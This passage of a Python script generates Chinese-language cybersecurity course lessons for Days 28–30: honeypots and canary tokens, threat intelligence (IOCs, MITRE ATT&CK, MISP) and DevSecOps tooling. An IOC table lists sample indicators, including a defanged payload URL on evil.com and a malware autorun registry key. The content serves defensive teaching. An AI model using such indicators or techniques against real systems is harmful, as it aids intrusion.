         ('Snort/Suricata', '⭐⭐⭐⭐', '低', '开源IDS/IPS；规则驱动；Suricata多线程性能更好'),
     ],
     [('IDS/IPS 区别', '"IDS告警不拦截，IPS告警同时拦"', 'de tect(检测) vs prevent(阻止)——一个旁观一个上场', '')],
     [('IDS 配置了就能发现所有攻击', 'IDS 只能检测已知特征或明显异常；0day和低慢速攻击可能完全绕过。')],
     ['安装 Snort/Suricata 并配置社区规则集，分析你自己网络的告警量。'],
     'IDS是网络的"看门狗"——它不咬人但会叫。而IPS是"警卫"——直接把人拦在外面。第二十七天，你给网络装上了"警报系统"。',
    ),
]:
    make_day('basic', *d25_data)
    print(f"  [BASIC] Day {d25_data[0]} done, total lines so far: {total_lines}")
    sys.stdout.flush()

# Day 28: 蜜罐与诱捕技术
make_day('basic', 28, '蜜罐与诱捕技术', '中级', '30',
    '蜜罐（Honeypot）是安全防御中的"诱饵"——通过部署看似真实但实为陷阱的系统，诱导攻击者暴露情报和攻击手法。本章详解低交互/高交互蜜罐、Cowrie/Dionaea/Canary Token、欺骗防御平台和商业蜜网方案。',
    [
        S('一、蜜罐类型', '一蜜罐类型', r"""## 一、蜜罐分类

| 类型 | 交互度 | 风险 | 信息量 | 代表 |
|:---|:---|:---:|:---:|:---|
| **低交互** | 模拟服务响应 | 低 | 少 | Honeyd, Dionaea |
| **中交互** | 部分真实服务 | 中 | 中 | Cowrie(SSH) |
| **高交互** | 完整真实系统 | 高 | 多 | 完整Windows/Linux |

```bash
# Cowrie SSH蜜罐 (捕获攻击者SSH行为)
docker run -d -p 22:2222 cowrie/cowrie
# 日志: /cowrie/cowrie-git/var/log/cowrie/

# Dionaea 多协议蜜罐 (SMB/HTTP/FTP/MSSQL等)
docker run -d -p 21:21 -p 445:445 dinotools/dionaea
```"""),
        S('二、Canary Token', '二canary-token', r"""## 二、Canary Token（金丝雀令牌）

在敏感数据中嵌入"监听器"，一旦被访问即触发告警：

```text
类型:
├── DNS Token:  嵌入在文档/代码中的特殊域名 → 解析时告警
├── HTTP Token: 特殊URL → 被访问时告警
├── AWS Key:    假AWS密钥 → 有人尝试使用时告警
└── QR Code:    扫描二维码时告警

部署建议:
□ 在源代码仓库中放置假凭证
□ 在敏感文件共享中放置伪装文件
□ 在内部Wiki放置金丝雀URL
```
https://canarytokens.org 可免费生成。"""),
    ],
    [
        ('蜜罐交互级别', '⭐⭐⭐⭐', '中', '低交互模拟服务/高交互真实系统；信息量↑风险↑'),
        ('Cowrie/Dionaea', '⭐⭐⭐⭐', '中', 'Cowrie=SSH蜜罐/Dionaea=多协议蜜罐'),
        ('金丝雀令牌', '⭐⭐⭐⭐', '中', 'DNS/HTTP/QR Code令牌→被触发=入侵迹象'),
    ],
    [('蜜罐价值', '"信息量=风险量：低交互安全但信息少；高交互危险但信息多"', '在互联网部署优选低/中交互；在内网可信域可用高交互', '')],
    [('蜜罐会暴露我的真实系统', '蜜罐应物理/网络隔离，不存储真实数据。即使攻击者攻破蜜罐也无法访问生产网络。')],
    ['部署 Cowrie SSH蜜罐24小时，查看吸引了多少攻击者。', '使用 CanaryTokens 在敏感文件目录放置几个令牌。'],
    '蜜罐不只是一个"陷阱"——它是安全团队的眼睛，让你看到那些从未触发SIEM告警的"隐形"攻击者。第二十八天，你学会了"钓鱼"——钓的是攻击者。',
)

print(f"  [BASIC] Day 28 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 29: 威胁情报概述
make_day('basic', 29, '威胁情报概述', '中级', '30',
    '威胁情报（Threat Intelligence）让防御从"被动响应"升级为"主动预防"。本章详解STIX/TAXII标准、IOC（IP/域名/哈希/URL）、TTP（战术/技术/过程）、MITRE ATT&CK框架和威胁情报平台（MISP/OpenCTI），结合Pyramid of Pain讲解不同层次情报的价值。',
    [
        S('一、威胁情报基础', '一威胁情报基础', r"""## 一、威胁情报基础

### Pyramid of Pain（痛苦金字塔）

```
         ┌──────────────┐ 更难改变，更高价值
         │     TTPs     │  ← 战术/技术/过程（如鱼叉攻击流程）
         ├──────────────┤
         │    Tools     │  ← 攻击工具（如Cobalt Strike）
         ├──────────────┤
         │ Network/Host │  ← 网络/主机特征（如C2域名）
         ├──────────────┤
         │  Hash Values │  ← 文件哈希（如恶意软件MD5）
         └──────────────┘ 更容易改变，更低价值
```

> **🔑 高分考点**：文件哈希(Hash)是最容易改变的指标（改一个字节哈希全变），价值最低但最易获取；TTP是最难改变的（攻击者行为模式），价值最高但最难提取。
"""),
        S('二、IOC 指标', '二ioc-指标', r"""## 二、IOC（入侵指标）

| IOC类型 | 示例 | 生命周期 | 检测难度 |
|:---|:---|:---|:---|
| IP地址 | 45.xxx.xxx.xxx (C2) | 小时-天 | 低 |
| 域名 | evil-c2.xyz (DGA域名) | 天-周 | 低 |
| URL | hxxp://evil.com/payload | 天-月 | 中 |
| 文件哈希 | MD5/SHA256 | 文件变更即失效 | 低 |
| 注册表键 | HKCU\...\Run\malware | 持久化才会变 | 中 |
| 行为模式 | 特定API调用序列 | 极长 | 高 |"""),
        S('三、MITRE ATT&CK', '三mitre-attck', r"""## 三、MITRE ATT&CK 框架

```
攻击链在 ATT&CK 中的映射:
┌────────────┬──────────┬────────┬──────────┬──────────┐
│ Initial    │ Execution│ Persis-│ Privilege│ Lateral  │
│ Access  →  │       →  │ tence →│ Escala- →│ Movement │
│ T1566(钓鱼)│ T1059(PS)│ T1547  │ tion     │ T1021    │
└────────────┴──────────┴────────┴──────────┴──────────┘
     → Collection → Exfiltration → Impact
       T1005         T1041           T1486

ATT&CK 价值:
├── 统一攻击行为描述的"通用语言"
├── 威胁建模和红蓝对抗基准
├── 评估安全产品检测覆盖率
└── 指导威胁狩猎方向
```

### MISP 威胁情报平台

```bash
# MISP 部署
docker run -d -p 80:80 -p 443:443 misp/misp

# 功能：
# - 管理IOC数据库
# - STIX/TAXII 标准化情报共享
# - 社区/ISAC 情报订阅
# - 与 SIEM/EDR 联动
```"""),
    ],
    [
        ('Pyramid of Pain', '⭐⭐⭐⭐⭐', '高', 'Hash→IP→Domain→Host→Tools→TTPs，从底到顶价值递增'),
        ('IOC类型', '⭐⭐⭐⭐', '中', 'IP/域名/URL/Hash/注册表/行为模式'),
        ('MITRE ATT&CK', '⭐⭐⭐⭐⭐', '中', '14个战术类别+200+技术；红蓝对抗通用语言'),
        ('MISP平台', '⭐⭐⭐', '中', '开源威胁情报共享平台；支持STIX/TAXII标准'),
    ],
    [('痛苦金字塔', '"哈希易改-IP可换-域名可换-工具可换-TTP难改"', '越高层越难改变→越有价值；越低层越易变→价值越低', '')],
    [('威胁情报就是黑名单', '高质量的威胁情报包括TTPs、攻击者画像、攻击动机等多维度信息，远不止IP黑名单。')],
    ['在 MISP 中导入几条威胁情报并学会创建事件。', '使用 MITRE ATT&CK Navigator 绘制某个APT组织的技术覆盖图。'],
    '威胁情报不只是"坏IP列表"——它是关于"谁想攻击你、用什么方法、有什么动机"的完整画像。第二十九天，你学会了从"被动挨打"到"知己知彼"。',
)

print(f"  [BASIC] Day 29 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 30: 安全开发与总结
make_day('basic', 30, '安全开发与总结', '中级', '30',
    '安全开发（DevSecOps）将安全融入软件开发生命周期的每个阶段。本章详解安全SDLC、威胁建模（STRIDE）、SAST/DAST/IAST工具链、CI/CD安全（镜像扫描、签名验证、秘密管理），并总结30天全部学习内容，提供CISP考试冲刺建议。',
    [
        S('一、安全SDLC', '一安全sdlc', r"""## 一、安全开发全生命周期

```
需求分析 → 威胁建模 → 安全设计 → 安全编码 → 安全测试 → 安全部署 → 安全运营
   │          │          │          │          │          │          │
  安全需求   STRIDE     安全架构   SAST/SCA   DAST/PT    WAF/加固   SIEM/SOC
```

| 阶段 | 安全活动 | 工具 |
|:---|:---|:---|
| **需求** | 安全需求分析、隐私评估 | 需求模板 |
| **设计** | 威胁建模(STRIDE/攻击树) | MS TMT, OWASP Threat Dragon |
| **开发** | 安全编码规范、SAST、SCA | SonarQube, Snyk, Checkmarx |
| **测试** | DAST、IAST、渗透测试 | OWASP ZAP, Burp Suite, AWVS |
| **部署** | 镜像扫描、WAF、硬化 | Trivy, Clair, Nginx 安全配置 |
| **运营** | 漏洞管理、SOC监控、IR | Nessus, Splunk, SIEM |"""),
        S('二、威胁建模 STRIDE', '二威胁建模-stride', r"""## 二、威胁建模 STRIDE

| 字母 | 威胁类型 | 违反的安全属性 | Web攻击示例 |
|:---|:---|:---|:---|
| **S** | Spoofing(欺骗) | 认证 | 凭证窃取、Session劫持 |
| **T** | Tampering(篡改) | 完整性 | SQLi修改数据、XSS篡改页面 |
| **R** | Repudiation(否认) | 不可否认性 | 删除日志、无审计追踪 |
| **I** | Information Disclosure | 机密性 | 敏感数据泄露、源码暴露 |
| **D** | Denial of Service | 可用性 | DDoS、资源耗尽 |
| **E** | Elevation of Privilege | 授权 | 越权、提权、RCE |"""),
        S('三、CI/CD 安全', '三cicd-安全', r"""## 三、CI/CD 流水线安全

```
Git Push → SAST扫描 → SCA依赖检查 → 镜像构建 → 镜像扫描 → 签名 → 部署
  │          │            │             │          │        │
 密钥扫描    代码质量     已知漏洞       容器安全   无漏洞    可信发布
```

```bash
# Git 密钥扫描 (gitleaks)
gitleaks detect --source . --verbose

# 容器镜像扫描 (Trivy)
trivy image nginx:latest
trivy fs --security-checks vuln,config /path/to/project

# SCA 依赖检查
npm audit          # Node.js
pip-audit          # Python
mvn dependency-check:check  # Java

# 镜像签名 (Cosign)
cosign sign --key cosign.key myapp:latest
cosign verify --key cosign.pub myapp:latest
```"""),
        S('四、30天学习总结', '四30天学习总结', r"""## 四、30天学习回顾与考试建议

```
月安全学习全景（30天知识体系）:
┌──────────────────────────────────────────────┐
│ Week 1: 网络基础    | HTTP/HTTPS/TCP/IP/端口   │
│ Week 2: Web安全      | XSS/CSRF/SQLi/SSRF/文件上传 │
│ Week 3: 安全架构     | OWASP Top10/反序列化/等保  │
│ Week 4: 安全运营     | SIEM/IR/IDS/威胁情报/防火墙 │
│ Week 5: 开发+总结    | DevSecOps/CI-CD安全/CISP冲刺│
└──────────────────────────────────────────────┘
```

### CISP 考试冲刺建议
1. **CIA三要素** + **等保2.0** + **密码学**是CISP考试最高频考点
2. **OWASP Top 10** 要对每项风险的定义、案例、防御了然于胸
3. **CVE/CVSS/CWE** 体系要理解区别和联系
4. **安全管理** 部分(30%分值)不容轻视——人员/流程/制度/培训
5. **应急响应PDCERF** 和 **BCP/DRP** 是常考大题"""),
    ],
    [
        ('STRIDE 六威胁', '⭐⭐⭐⭐⭐', '中', '欺骗/篡改/否认/信息泄露/拒绝服务/权限提升'),
        ('SAST/DAST/IAST', '⭐⭐⭐⭐', '中', 'SAST白盒扫描代码；DAST黑盒扫描运行应用；IAST灰盒插桩检测'),
        ('CI/CD 安全检查点', '⭐⭐⭐⭐', '中', '密钥扫描→SAST→SCA→镜像扫描→签名→部署'),
        ('30天体系回顾', '⭐⭐⭐⭐⭐', '低', '网络基础→Web安全→安全架构→安全运营→DevSecOps'),
    ],
    [('STRIDE', '"Sp-欺 Ta-改 Re-否 In-泄 De-拒 El-权"', 'Spoofing/Tampering/Repudiation/InfoDisclosure/DoS/Elevation——违反CIA+N+R', '')],
    [('DevSecOps就是装安全工具', 'DevSecOps是文化和流程变革，工具是辅助。关键是"安全左移"——在最早阶段发现和修复问题。')],
    ['完成一个完整的DevSecOps流水线：代码提交→SAST扫描→依赖检查→镜像构建→镜像扫描→部署。'],
    '30天的学习不是终点，而是起点。网络安全是一个持续学习的领域——今天的安全基线，明天就可能过时。保持学习的习惯，保持对新技术的好奇心，你才算真正入了门。第三十天，祝贺你完成了基础之旅的"成人礼"。',
)

print(f"  [BASIC] Day 30 done, total lines so far: {total_lines}")
print("\n=== BASIC CATEGORY COMPLETE ===\n")
sys.stdout.flush()
